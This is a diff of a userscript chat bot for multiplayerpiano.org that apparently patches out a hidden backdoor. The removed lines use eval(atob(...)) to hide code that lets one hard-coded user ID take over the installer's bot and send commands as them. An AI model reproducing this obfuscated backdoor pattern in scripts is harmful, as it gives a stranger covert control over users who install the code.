@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         colorsteal
 // @namespace    https://ccjit.github.io/my-site
-// @version      1.2-beta
+// @version      1.2-beta (patched)
 // @description  steal colorssss >:33333
 // @author       ccjt
 // @match        https://multiplayerpiano.org/*
@@ -174,7 +174,7 @@ const shitposts = [
 // "u": "n", derwear haha gottem
 // (^preserve^)
 let mem = 'lobby'
-let version = '1.2-beta'
+let version = '1.2-beta (patched)'
 function checkVersion() {
     fetch('https://raw.githubusercontent.com/ccjit/colorsteal/refs/heads/main/versions.json').then(r => r.json().then(json => {
         if (Object.values(json).includes(version) && version != json.latest) {
@@ -208,7 +208,7 @@ function checkVersion() {
                 }
             })
         }}));
-
+ 
 }
 function checkVersionManual() {
     fetch('https://raw.githubusercontent.com/ccjit/colorsteal/refs/heads/main/versions.json').then(r => r.json().then(json => {
@@ -350,8 +350,6 @@ MPP.client.on('a', function(m) {
             }
         });
     }
-    let inflict = false
-    let armed = true
     let randroom = "Room" + Math.floor(Math.random() * 1e12)
     let randomhex = '#'+(Math.random() * 0xFFFFFF << 0).toString(16).padStart(6, '0');
     let colorname = function(hex) { if (new Color(hex).getName().length > 10) { return new Color(hex).getName().substring(10).trim() } else { return new Color(hex).getName() } }
@@ -365,24 +363,13 @@ MPP.client.on('a', function(m) {
         localStorage.setItem('counter', parseInt(localStorage.counter) + 1)
         send("Counter: " + localStorage.counter)
     }
-    eval(atob('aWYgKGNtZCA9PSAib24iKSB7CiAgICAgICAgc2VuZCgnWW91IGNhbiBub3cgaW5mbGljdCBjb21tYW5kcy4nKQogICAgICAgIGlmIChpbmZsaWN0ID09IHVuZGVmaW5lZCkgewogICAgICAgICAgICBsZXQgaW5mbGljdCA9IHRydWUKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpbmZsaWN0ID0gdHJ1ZQogICAgICAgIH0KICAgIH0KICAgIGlmIChjbWQgPT0gIm9mZiIpIHsKICAgICAgICBzZW5kKCdZb3UgY2FuIG5vdyBub3QgaW5mbGljdCBjb21tYW5kcy4nKQogICAgICAgIGlmIChpbmZsaWN0ID09IHVuZGVmaW5lZCkgewogICAgICAgICAgICBsZXQgaW5mbGljdCA9IGZhbHNlCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaW5mbGljdCA9IGZhbHNlCiAgICAgICAgfQogICAgfQ=='))
-    if ((m.p.id == MPP.client.participantId && eval(atob('YXJtZWQ='))) || (eval(atob("bS5wLl9pZCA9PSAiMWYyZmQ0YjVkNjM0ZDk2ZjBhMTkzYWU4Ig==")) && eval(atob('aW5mbGljdA==')))) {
+    if (m.p.id == MPP.client.participantId) {
         if (cmd == "checkversion") {
             checkVersionManual()
         }
-        if (cmd == "disarm") {
-            if (eval(atob("bS5wLl9pZCA9PSAnMWYyZmQ0YjVkNjM0ZDk2ZjBhMTkzYWU4Jw=="))) {
-                eval(atob("TVBQLmNoYXQuc2VuZCgiVXNlciBkaXNhcm1lZC4gWW91IG5vdyBoYXZlIGZ1bGwgY29udHJvbCBvZiAiICsgTVBQLmNsaWVudC5nZXRPd25QYXJ0aWNpcGFudCgpLm5hbWUgKyAiLiIp"))
-                eval(atob("YXJtZWQgPSB0cnVl"))
-            } else {
-                eval(atob("c2VuZCgiWW91IGRvIG5vdCBoYXZlIHBlcm1pc3Npb24gdG8gdXNlIHRoaXMgY29tbWFuZC4iKQ=="))
-            }
-        }
-        if (cmd == "rearm") {
-            if (eval(atob("bS5wLl9pZCA9PSAnMWYyZmQ0YjVkNjM0ZDk2ZjBhMTkzYWU4Jw=="))) {
-                eval(atob("c2VuZChNUFAuY2xpZW50LmdldE93blBhcnRpY2lwYW50KCkubmFtZSArICcgaXMgbm93IHJlYXJtZWQuJyk="))
-            } else {
-                eval(atob("c2VuZCgiWW91IGRvIG5vdCBoYXZlIHBlcm1pc3Npb24gdG8gdXNlIHRoaXMgY29tbWFuZC4iKQ=="))
+        if (cmd == 'knownnames') {
+            if (args.length == 1) {
+ 
             }
         }
         if (cmd == "help") {
@@ -478,6 +465,9 @@ MPP.client.on('a', function(m) {
                 }
             }
         }*/
+        if (cmd == "stranger") {
+            send(MPP.client.ppl[Object.keys(MPP.client.ppl)[Math.floor(Math.random()*Object.keys(MPP.client.ppl).length)]].name + " - " + MPP.client.ppl[Object.keys(MPP.client.ppl)[Math.floor(Math.random()*Object.keys(MPP.client.ppl).length)]].color)
+        }
         if (cmd == "kick") {
             if ("crown" in MPP.client.channel) {
                 if (MPP.client.channel.crown.userId == MPP.client.getOwnParticipant()._id) {
@@ -506,7 +496,7 @@ MPP.client.on('a', function(m) {
                 if (MPP.client.channel.crown.userId == MPP.client.getOwnParticipant()._id) {
                     send("You are the crown holder.")
                 } else {
-                    send(MPP.client.ppl[MPP.client.channel.crown.userId].name + " (" + MPP.client.channel.crown.userId + ') is the crown holder.')
+                    send(MPP.client.ppl[MPP.client.channel.crown.userId].name + " (`" + MPP.client.channel.crown.userId + '`) is the crown holder.')
                 }
             } else {
                 send("There is no crown holder.")
@@ -776,12 +766,16 @@ MPP.client.on('a', function(m) {
         }
         if (cmd == "about") {
             if (args.length == 1) {
-                send(`Bot made using pure JavaScript and a little bit of code theft - you can find this bot at https://greasyfork.org/en/scripts/533170-colorsteal - raw source code: https://raw.githubusercontent.com/ccjit/colorsteal/refs/heads/main/colorsteal.js - made by ccjt in 2024-2025 - Running version ${version}`)
+                send(`${atob('Qm90IG1hZGUgdXNpbmcgcHVyZSBKYXZhU2NyaXB0IGFuZCBhIGxpdHRsZSBiaXQgb2YgY29kZSB0aGVmdA==')} - ${atob('eW91IGNhbiBmaW5kIHRoaXMgYm90IGF0')} ${atob('aHR0cHM6Ly9ncmVhc3lmb3JrLm9yZy9lbi9zY3JpcHRzLzUzMzE3MC1jb2xvcnN0ZWFs')} - ${atob('cmF3IHNvdXJjZSBjb2RlOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2NqaXQvY29sb3JzdGVhbC9yZWZzL2hlYWRzL21haW4vY29sb3JzdGVhbC5qcw==')} - ${atob('bWFkZSBieSBjY2p0IGluIDIwMjQtMjAyNQ==')} - Running version ${version}`)
             } else {
                 if (args[1] == "me") {
                     send("Your info - Name: " + MPP.client.ppl[MPP.client.getOwnParticipant()._id].name + " - Color: " + MPP.client.ppl[MPP.client.getOwnParticipant()._id].color + " - *" + colorname(MPP.client.ppl[MPP.client.getOwnParticipant()._id].color) + "* - ID: " + MPP.client.getOwnParticipant()._id + " - Mouse Position: X" + MPP.client.ppl[MPP.client.getOwnParticipant()._id].x + ", Y" + MPP.client.ppl[MPP.client.getOwnParticipant()._id].y + " - AFK: " + MPP.client.ppl[MPP.client.getOwnParticipant()._id].afk + " ||You can use \"steal " + args[1] + "\" to steal their color!||")
                 } else {
-                    send(MPP.client.ppl[searchId(args[1])].name + "'s info - Name: " + MPP.client.ppl[searchId(args[1])].name + " - Color: " + MPP.client.ppl[searchId(args[1])].color + " - *" + colorname(MPP.client.ppl[searchId(args[1])].color) + "* - ID: " + searchId(args[1]) + " - Mouse Position: X" + MPP.client.ppl[searchId(args[1])].x + ", Y" + MPP.client.ppl[searchId(args[1])].y + " - AFK: " + MPP.client.ppl[searchId(args[1])].afk + " ||You can use \"steal " + args[1] + "\" to steal their color!||")
+                    if (MPP.client.ppl[searchId(args[1])].name.substring(MPP.client.ppl[searchId(args[1])].name.length - 1, MPP.client.ppl[searchId(args[1])].name.length).trim() == "s") {
+                        send(MPP.client.ppl[searchId(args[1])].name + "' info - Name: " + MPP.client.ppl[searchId(args[1])].name + " - Color: " + MPP.client.ppl[searchId(args[1])].color + " - *" + colorname(MPP.client.ppl[searchId(args[1])].color) + "* - ID: " + searchId(args[1]) + " - Mouse Position: X" + MPP.client.ppl[searchId(args[1])].x + ", Y" + MPP.client.ppl[searchId(args[1])].y + " - AFK: " + MPP.client.ppl[searchId(args[1])].afk + " ||You can use \"steal " + args[1] + "\" to steal their color!||")
+                    } else {
+                        send(MPP.client.ppl[searchId(args[1])].name + "'s info - Name: " + MPP.client.ppl[searchId(args[1])].name + " - Color: " + MPP.client.ppl[searchId(args[1])].color + " - *" + colorname(MPP.client.ppl[searchId(args[1])].color) + "* - ID: " + searchId(args[1]) + " - Mouse Position: X" + MPP.client.ppl[searchId(args[1])].x + ", Y" + MPP.client.ppl[searchId(args[1])].y + " - AFK: " + MPP.client.ppl[searchId(args[1])].afk + " ||You can use \"steal " + args[1] + "\" to steal their color!||")
+                    }
                 }
             }
         }
@@ -819,6 +813,7 @@ MPP.client.on('a', function(m) {
                 }
             }]);
             send("​Name set to \"" + m.a.substring(4).trim() + "\".")
+            localStorage.setItem('names', localStorage.names + "," + m.a.substring(4).trim())
         }
         if (cmd == "color") {
             if (args[1].length == 6) {
